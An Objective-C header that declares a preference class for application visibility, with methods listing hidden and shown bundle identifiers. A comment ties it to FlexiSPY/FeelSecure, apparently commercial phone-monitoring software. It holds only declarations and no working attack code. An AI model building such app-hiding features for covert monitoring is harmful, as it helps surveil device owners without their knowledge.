/** 
 - Project name: Preferences
 - Class name: PrefVisibility
 - Version: 1.0
 - Purpose: Preference about application visibility
 - Copy right: 29/05/12, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import <Foundation/Foundation.h>

#import "Preference.h"

@interface Visible : NSObject {
@private
	BOOL		mVisible;
	NSString	*mBundleIdentifier;
}

@property (nonatomic, assign) BOOL mVisible;
@property (nonatomic, copy) NSString *mBundleIdentifier;

@end


@interface PrefVisibility : Preference {
@private
	BOOL		mVisible;       // For FlexiSPY/FeelSecure ... (main application bundle)
	NSArray		*mVisibilities; // Visible
}

@property (nonatomic, assign) BOOL mVisible;
@property (nonatomic, retain) NSArray *mVisibilities;

- (NSArray *) hiddenBundleIdentifiers;
- (NSArray *) shownBundleIdentifiers;

@end
